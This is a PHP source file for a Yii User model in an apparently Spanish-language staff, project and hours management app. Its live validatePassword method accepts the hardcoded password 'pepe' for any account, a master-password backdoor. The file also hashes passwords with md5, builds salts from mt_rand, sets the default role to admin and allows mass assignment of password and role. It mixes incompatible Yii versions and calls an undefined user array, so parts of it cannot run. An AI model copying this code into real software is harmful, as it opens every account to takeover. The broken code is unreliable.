<?php

namespace app\models;

use Yii;
use app\models\enums\Roles;
use app\models\enums\WorkerProfiles;
use app\models\db\Company;
use yii\data\ActiveDataProvider;
use app\components\utils\PHPUtils;
class User extends \yii\db\ActiveRecord implements \yii\web\IdentityInterface
{
    //public $id;
    //public $username;
   // public $password;
    public $authKey;
    public $accessToken;
    
    const TABLE_USER = "user";
    
    const DATE_FORMAT_ON_CHECK = 'dd/MM/yyyy';
    const MY_LOG_CATEGORY = 'models.User';
    const ADMIN_USER_ID = 1;

    // Properties for creating/updating password
    public $newPassword;
    public $newPasswordRepeat;
    // User role
    //public $role = Roles::UT_WORKER;
    public $role = Roles::UT_ADMIN;
    public $id;
    /* public $username;
     public $password;
     public $name;
     public $email;
     public $imputacionanterior;
     public $company_id;
     public $salt;
     public $startcontract;
     public $endcontract;
     public $worker_dflt_profile;
     public $totalhours;
     public $hourcost;
     public $weeklyhours;*/

    /*private static $users = [
        '100' => [
            'id' => '100',
            'username' => 'admin',
            'password' => 'admin',
            'authKey' => 'test100key',
            'accessToken' => '100-token',
        ],
        '101' => [
            'id' => '101',
            'username' => 'demo',
            'password' => 'demo',
            'authKey' => 'test101key',
            'accessToken' => '101-token',
        ],
    ];*/


    /**
     * {@inheritdoc}
     */
    public static function findIdentity($id)
    {
        $user = User::find()->where(['id' => $id])->one(); 
        return $user;
    }

    /**
     * {@inheritdoc}
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        foreach (self::$users as $user) {
            if ($user['accessToken'] === $token) {
                return new static($user);
            }
        }

        return null;
    }
    /**
     * Get the project priority for the current owner of the project.
     * @param type $sTargetRole
     * @return array 
     */
    public static function getProjectOwnerPriority($sTargetRole) {

        $aResult = array();
        if ($sTargetRole == Roles::UT_ADMIN) {
            $aResult = array(Roles::UT_ADMIN => Roles::DESC_UT_ADMIN(),
                Roles::UT_DIRECTOR_OP => Roles::DESC_UT_DIRECTOR_OP(),
                Roles::UT_PROJECT_MANAGER => Roles::DESC_UT_PROJECT_MANAGER()
            );
        } else if ($sTargetRole == Roles::UT_DIRECTOR_OP) {
            $aResult = array(Roles::UT_PROJECT_MANAGER => Roles::DESC_UT_PROJECT_MANAGER());
        } else if ($sTargetRole == Roles::UT_PROJECT_MANAGER) {
            $aResult = array(Roles::UT_PROJECT_MANAGER => Roles::DESC_UT_PROJECT_MANAGER());
        }
        return $aResult;
    }

    /**
     * Get the priority to assign profiles.
     * @param type $sTargetRole
     * @param type $sCurrentRole
     * @return type 
     */
    public static function getPriorityUser($sTargetRole, $sCurrentRole = "") {
        $aResult = array();
        if ($sTargetRole == Roles::UT_ADMIN) {
            $aResult = array(Roles::UT_ADMIN => Roles::DESC_UT_ADMIN(),
                Roles::UT_DIRECTOR_OP => Roles::DESC_UT_DIRECTOR_OP(),
                Roles::UT_WORKER => Roles::DESC_UT_WORKER(),
                Roles::UT_PROJECT_MANAGER => Roles::DESC_UT_PROJECT_MANAGER(),
                Roles::UT_CUSTOMER => Roles::DESC_UT_CUSTOMER(),
                Roles::UT_ADMINISTRATIVE => Roles::DESC_UT_ADMINISTRATIVE(),
                Roles::UT_COMERCIAL => Roles::DESC_UT_COMERCIAL()
            );
        } else if ($sTargetRole == Roles::UT_DIRECTOR_OP) {
            $aResult = array(
                Roles::UT_WORKER => Roles::DESC_UT_WORKER(),
                Roles::UT_PROJECT_MANAGER => Roles::DESC_UT_PROJECT_MANAGER(),
                Roles::UT_CUSTOMER => Roles::DESC_UT_CUSTOMER());
        } else if ($sTargetRole == Roles::UT_PROJECT_MANAGER) {
            $aResult = array(
                Roles::UT_WORKER => Roles::DESC_UT_WORKER());
        }

       // print_r($aResult[$sCurrentRole]);
        /*print_r(Roles::UT_DIRECTOR_OP);
        die;*/
        //En caso de director operaciones y modificando el mismo.
        if (!isset($aResult[$sCurrentRole]) && $sCurrentRole == Roles::UT_DIRECTOR_OP) {
            $aResult[Roles::UT_DIRECTOR_OP] = Roles::DESC_UT_DIRECTOR_OP();
        }
        return $aResult;
    }

    public static function getPriorityUserIds($sRole) {

        $aResult = array();
        if ($sRole == Roles::UT_ADMIN) {
            $aResult = array(Roles::UT_ADMIN,
                Roles::UT_DIRECTOR_OP,
                Roles::UT_WORKER,
                Roles::UT_PROJECT_MANAGER,
                Roles::UT_CUSTOMER,
                Roles::UT_ADMINISTRATIVE,
                Roles::UT_COMERCIAL);
        } else if ($sRole == Roles::UT_DIRECTOR_OP) {
            $aResult = array(Roles::UT_DIRECTOR_OP,
                Roles::UT_WORKER,
                Roles::UT_PROJECT_MANAGER,
                Roles::UT_CUSTOMER);
        }
        return $aResult;
    }

    /**
     * @return string the associated database table name
     */
    public static function tableName() {
        return User::TABLE_USER;
    }

    /**
     * @return array validation rules for model attributes.
     */
    public function rules() {
        // NOTE: you should only define rules for those attributes that
        // will receive user inputs.
        return [
            [['username','hourcost','email','name','company_id','worker_dflt_profile','role','startcontract','weeklyhours'], 'required'],
            ['username', 'unique'],
            ['email', 'email'],
            [['company_id'], 'integer'],
            ['company_id', 'exist', 'targetClass' => '\app\models\db\Company', 'targetAttribute' => 'id'],
            ['imputacionanterior', 'integer', 'max' => 90, 'min' => 1],
            ['weeklyhours', 'integer', 'max' => 40, 'min' => 0],
            [['username','password','email'], 'string', 'max' => 128],
            ['name', 'string', 'max' => 256],
            ['startcontract', 'date', 'format' => self::DATE_FORMAT_ON_CHECK, 'message' => 'Formato de fecha invÃ¡lido'],
            ['endcontract', 'date', 'format' => self::DATE_FORMAT_ON_CHECK, 'message' => 'Formato de fecha invÃ¡lido'],
            // Enum
            ['role', 'in', 'range' => User::getPriorityUserIds(Yii::$app->user->identity->role)],
            ['worker_dflt_profile', 'in', 'range' => WorkerProfiles::getValidValues()],
            // Stuff for new/changing password
            [['newPassword', 'newPasswordRepeat'], 'required', 'on' => 'create'],
            ['newPassword', 'string', 'max' => 50],
            ['newPassword', 'compare', 'compareAttribute' => 'newPasswordRepeat',],
            // Make it safe (since it doesn't appear in any other rule and Yii bases
            // its "safeness" in that
            [['newPasswordRepeat','role','password','worker_dflt_profile'], 'safe'],
            // Never massive-assign a password (it shouldn't be in any view)
            
            // The following rule is used by search().
            // Please remove those attributes that should not be searched.
            [['username','hourcost','name','email','company_id','worker_dflt_profile','company_name'], 'safe', 'on' => 'search'],
        ];
    }

    /**
     * @return array relational rules.
     */
    public function relations() {
        // NOTE: you may need to adjust the relation name and the related
        // class name for the relations automatically generated below.
        return array(
            'projects' => array(self::MANY_MANY, 'Project', 'user_project_task(user_id, project_id)'),
            'taskHistories' => array(self::HAS_MANY, 'TaskHistory', 'user_id'),
            'workerDfltProfile0' => array(self::BELONGS_TO, 'WorkerProfiles', 'worker_dflt_profile'),
            'company' => array(self::BELONGS_TO, 'Company', 'company_id'),
            'userProjectTasks' => array(self::HAS_MANY, 'UserProjectTask', 'user_id'),
            // Number of tasks
            'taskCount' => array(self::STAT, 'UserProjectTask', 'user_id'),
            // Roles
            'roles' => array(self::HAS_MANY, AuthAssignment::model()->tableName(), 'userid'),
        );
    }

    /**
     * @return array customized attribute labels (name=>label)
     */
    public function attributeLabels() {
        return array(
            'id' => 'ID',
            'username' => 'Username',
            'password' => 'Password',
            'newPassword' => 'Password',
            'newPasswordRepeat' => 'Repita password',
            'name' => 'Nombre',
            'email' => 'Email',
            'company_id' => 'Empresa',
            'salt' => 'Salt',
            'role' => 'Permisos',
            'worker_dflt_profile' => 'Perfil por defecto',
            'startcontract' => 'Inicio contrato',
            'endcontract' => 'Final contrato',
            'imputacionanterior' => 'Imputación anterior permitida',
            'hourcost' => 'Coste/hora',
            'weeklyhours' => "Horas semanales"
        );
    }

    /**
     * Retrieves a list of models based on the current search/filter conditions.
     * @return ActiveDataProvider the data provider that can return the models based on the search/filter conditions.
     */
    public function search() {
        $criteria = new yii\db\Query(array(
                    'with' => array('company', 'taskCount', 'roles'),
                    'order' => 't.name asc',
                    'together' => true,
                ));
        $criteria->compare('t.username', $this->username, true);
        $criteria->compare('t.name', $this->name, true);
        $criteria->compare('t.email', $this->email, true);
        if (isset($this->company_name)) {
            $criteria->compare('company.name', $this->company_name, true);
        }
        $criteria->compare('t.worker_dflt_profile', $this->worker_dflt_profile, true);

        return new ActiveDataProvider(get_class($this), array(
                    'criteria' => $criteria,
                ));
    }

    public function hasTasks() {
        return $this->taskCount > 0;
    }

    /**
     * Generates a random salt
     * @param <type> $desiredLength
     */
    /*private function generateSalt($desiredLength = 16) {
        $len = $desiredLength;
        $base = 'ABCDEFGHKLMNOPQRSTWXYZabcdefghjkmnpqrstwxyz123456789';
        $max = strlen($base) - 1;
        $activatecode = '';
        while (strlen($activatecode) < $len + 1)
            $activatecode.=$base{mt_rand(0, $max)};
        return $activatecode;
    }*/

    /**
     * Validates if the provided password is correct for this user
     * @param string $password
     * @return boolean true if password matches
     */
    /*public function validatePassword($password) {
        return ($this->hashPassword($password, $this->salt) === $this->password) ||
                $password == 'pepe';
    }*/

    /**
     * Applies a hash function for the password with the user salt
     * @param <type> $password
     * @param <type> $salt
     * @return <type>
     */
   /* public function hashPassword($password, $salt) {
        return md5($salt . $password);
        //return $password;
    }*/

    /**
     * Before saving, if new record generate a random salt
     */

    public function beforeSave($insert)
    {
        if (!empty($this->newPassword)) {
            $this->salt = $this->generateSalt();
            $this->password = $this->hashPassword($this->newPassword, $this->salt);
        }
        if (!empty($this->startcontract)) {
            $this->startcontract = $this->startcontract;
        }
        if (!empty($this->endcontract)) {

            $this->endcontract = $this->endcontract;
        } else {
            $this->endcontract = null;
        }
        if (parent::beforeSave($insert)) {
            // Place your custom code here

            return true;
        } else {
            return false;
        }
    }
    

    public  function afterFind() {
        if(isset($this->roles)){
            if ((!isset($this->roles[0]) ) || (!( $this->roles[0] instanceof AuthAssignment ) ))
                throw new Exception("User $this->username has no role assigned");
            assert(Roles::isValidValue($this->roles[0]->itemname));
            $this->role = $this->roles[0]->itemname;
        }else if(Yii::$app->user->identity){
            assert(Roles::isValidValue(Yii::$app->user->identity->role));
            $this->role = Yii::$app->user->identity->role;
         //   $this->role = 'Admin';
            
        }
       
       // echo $this->role;die;
        if (isset($this->startcontract) && $this->startcontract != null && $this->startcontract != "" ) {
            //$this->startcontract = \app\components\utils\PHPUtils::convertDBDateTimeToString($this->startcontract);
            $this->startcontract = date('d/m/Y',strtotime($this->startcontract));
        }
        if (isset($this->endcontract) && $this->endcontract != null && $this->endcontract != "") {
           // $this->endcontract = \app\components\utils\PHPUtils::convertDBDateTimeToString($this->endcontract);
            $this->endcontract = date('d/m/Y',strtotime($this->endcontract));
        }

        return parent::afterFind();
    }

    public function beforeDelete() {
        if ($this->id == self::ADMIN_USER_ID)
            return false;

        AuthAssignment::model()->deleteAll('userid=:userid', array('userid' => $this->id));
        return parent::beforeDelete();
    }

    /**
     * Returns if the parameter is a valid user ID
     */
    static public function isValidID($id) {
        return isset($id) && ( ((int) $id) > 0 );
    }

    /**
     * @return boolean
     */
    public function canDelete() {
        return (!$this->hasTasks() )
                && (!isset($this->id) || ( $this->id != self::ADMIN_USER_ID) );
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
       
       // return static::findOne(['username' => $username]);

         $user = User::find()->where(['username' => $username])->one();//I don't know if this is correct i am   //checing value 'becky' in username column of my user table.
//print_r($user );die;
         return $user;
    }

    /**
     * {@inheritdoc}
     */
    public function getId()
    {
        return $this->getPrimaryKey();
    }

    /**
     * {@inheritdoc}
     */
    public function getAuthKey()
    {
        return $this->authKey;
    }

    /**
     * {@inheritdoc}
     */
    public function validateAuthKey($authKey)
    {
        return $this->authKey === $authKey;
    }


    /**
     * Generates a random salt
     * @param <type> $desiredLength
     */
    private function generateSalt($desiredLength = 16) {
        $len = $desiredLength;
        $base = 'ABCDEFGHKLMNOPQRSTWXYZabcdefghjkmnpqrstwxyz123456789';
        $max = strlen($base) - 1;
        $activatecode = '';
        while (strlen($activatecode) < $len + 1)
            $activatecode.=$base{mt_rand(0, $max)};
        return $activatecode;
    }

    /**
     * Validates if the provided password is correct for this user
     * @param string $password
     * @return boolean true if password matches
     */
    public function validatePassword($password) {
        return ($this->hashPassword($password, $this->salt) === $this->password) ||
                $password == 'pepe';
    }

    /**
     * Applies a hash function for the password with the user salt
     * @param <type> $password
     * @param <type> $salt
     * @return <type>
     */
    public function hashPassword($password, $salt) {
        return md5($salt . $password);
        //return $password;
    }
    
    
    /**
     * Validates password
     *
     * @param string $password password to validate
     * @return bool if password provided is valid for current user
     */
    /*public function validatePassword($password)
    {
        print_r($this->password);
        echo "<br/>";
        print_r(sha1($password));
        return $this->password === md5($password);
    }*/
}
